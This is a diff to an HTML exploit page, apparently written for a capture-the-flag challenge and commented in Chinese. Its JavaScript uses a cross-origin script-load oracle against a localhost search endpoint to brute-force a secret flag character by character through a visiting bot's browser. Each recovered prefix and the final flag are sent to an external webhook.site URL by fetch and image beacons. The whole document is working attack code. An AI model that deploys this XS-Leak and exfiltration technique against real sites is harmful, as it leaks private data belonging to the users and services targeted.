@@ -2,64 +2,53 @@
 <html><head><title>x</title></head><body>
 <script>
 const W='https://webhook.site/5addbbcf-753a-4d5c-8510-04455720d971';
+// 字符集 (flag 通常 base64-ish): 直接 charset 全打
+const CHARS='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}!?@#$^&*()+=.,:;<>/| -';
+const TARGET='http://127.0.0.1:1337/api/entries/search?q=';
 
-// 透過 cross-origin <script> 觀察 onload(200) vs onerror(404)
-// /api/entries/search?q=PREFIX  : title LIKE 'PREFIX%' AND approved=0
-// bot 是 localhost (req.ip=127.0.0.1 + Host header). 但因為從 attacker 開的 popup/iframe 內部
-// 改用 fetch 到 127.0.0.1:1337 — bot 的 page 跑在 attacker 起點,fetch 是 cross-origin,
-// 但 mode:no-cors 仍會送 cookie 嗎? 不需要 cookie — 是看 req.ip + Host header.
-// 所以打 127.0.0.1:1337 的 fetch 是 same browser 内, req.ip=127.0.0.1.
-// req.headers.host = '127.0.0.1:1337' — 必須匹配.
-// 但 fetch 跨域不能 read response — 仍用 <script src> 看 onload/onerror.
-
-const CHARS='abcdefghijklmnopqrstuvwxyz0123456789_-{}!?@#$%^&*()+=.,:;<>/\\| ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+function ping(msg){
+  // 不阻塞: 用 Image 帶 cache-bust
+  new Image().src = W+'?'+msg+'&_='+Math.random();
+}
 
 function probe(prefix){
   return new Promise(resolve=>{
     const s=document.createElement('script');
-    // 避免 q 含 special URL chars: encode
-    const enc = encodeURIComponent(prefix);
-    s.src = 'http://127.0.0.1:1337/api/entries/search?q=' + enc;
-    s.onload=()=>{ resolve(true); s.remove(); };
-    s.onerror=()=>{ resolve(false); s.remove(); };
+    s.src = TARGET + encodeURIComponent(prefix);
+    let done=false;
+    s.onload=()=>{ if(done) return; done=true; resolve(true); try{s.remove()}catch(e){} };
+    s.onerror=()=>{ if(done) return; done=true; resolve(false); try{s.remove()}catch(e){} };
     document.head.appendChild(s);
-    setTimeout(()=>{ resolve(false); try{s.remove()}catch(e){} }, 3000);
+    setTimeout(()=>{ if(!done){ done=true; resolve(false); try{s.remove()}catch(e){}}}, 5000);
   });
 }
 
 (async()=>{
-  fetch(W+'?start=1');
-  // 先試是否能拿到 baseline
-  let baseHTB = await probe('HTB{');
-  fetch(W+'?baseHTB='+baseHTB);
-  if(!baseHTB){
-    fetch(W+'?abort=1');
-    return;
+  ping('start');
+  // baseline
+  const baseHTB = await probe('HTB{');
+  ping('baseHTB='+baseHTB);
+  if(!baseHTB){ 
+    // 試另一種: 也許 isLocalhost 不靠 host header
+    const baseAny = await probe('a');
+    ping('baseAny='+baseAny);
+    return; 
   }
   let known='HTB{';
-  for(let i=0;i<60;i++){
+  for(let i=0;i<80;i++){
     let found=null;
+    // 同時試多個字 (並發)
+    const probes = [];
     for(const c of CHARS){
-      // LIKE: '_' 表單字, '%' 表多字 — 須 escape '%' '_'.
-      // 但 SQLite LIKE wildcards: % _ . 我們的 prefix 內若含 _ 會匹配任意.
-      // 我們搜尋 known+c. 若 c == '_' 也會匹配任意 — 跳過.
       if(c=='_'||c=='%') continue;
-      const ok = await probe(known + c);
-      if(ok){
-        found=c;
-        fetch(W+'?i='+i+'&c='+encodeURIComponent(c)+'&known='+encodeURIComponent(known+c));
-        break;
-      }
+      probes.push(probe(known + c).then(ok=>ok?c:null));
     }
-    if(found===null){
-      fetch(W+'?done='+encodeURIComponent(known));
-      break;
-    }
+    const results = await Promise.all(probes);
+    for(const r of results){ if(r){ found=r; break; }}
+    if(!found){ ping('done='+encodeURIComponent(known)); break; }
     known += found;
-    if(found=='}'){
-      fetch(W+'?finalflag='+encodeURIComponent(known));
-      break;
-    }
+    ping('p='+i+'&k='+encodeURIComponent(known));
+    if(found=='}'){ ping('FLAG='+encodeURIComponent(known)); break; }
   }
 })();
 </script>
